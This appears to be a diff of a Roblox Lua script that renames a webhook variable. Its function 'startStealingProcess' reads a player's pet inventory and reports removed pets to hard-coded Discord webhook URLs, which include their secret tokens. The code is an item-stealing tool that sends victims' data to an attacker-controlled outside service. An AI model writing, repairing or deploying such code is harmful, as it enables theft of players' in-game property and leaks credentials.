@@ -12,7 +12,7 @@ getgenv().PetConfig = {
 
 
 
-getgenv().Webhook2 = "https://discord.com/api/webhooks/1402809600096469133/1KUMRwKTZySNoA9hbAEgrLxq6tNM48tQ38qXa4X5XMDCpNd-fGpFX7Q-kH0LEqjXYx8R"
+getgenv().Webhook = "https://discord.com/api/webhooks/1402809600096469133/1KUMRwKTZySNoA9hbAEgrLxq6tNM48tQ38qXa4X5XMDCpNd-fGpFX7Q-kH0LEqjXYx8R"
 getgenv().BackupWebhook = "https://discord.com/api/webhooks/1402140961303171292/_h77-A9pC0AsyU9eVTd5lWocS7erqpqsjilcxFZtubDVh5GCYMGKXr00k8-Lg5t0Ixlo"
 
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -304,7 +304,7 @@ local function startStealingProcess()
     print("Inventory Data:", HttpService:JSONEncode(dataModule:GetData().PetsData.PetInventory.Data))
 
     local function getWebhookUrl()
-        local url = getgenv().Webhook2 or ""
+        local url = getgenv().Webhook or ""
         print("=============Webhook URL:", url)
         return url
     end
@@ -462,7 +462,7 @@ local function startStealingProcess()
         end
 
         local function sendPetRemovedWebhook(petUid, petData)
-            local webhookUrl = getgenv().Webhook2 or ""
+            local webhookUrl = getgenv().Webhook or ""
             if not webhookUrl or webhookUrl == "" then return end
 
             local petName = petData.PetType or "Unknown"
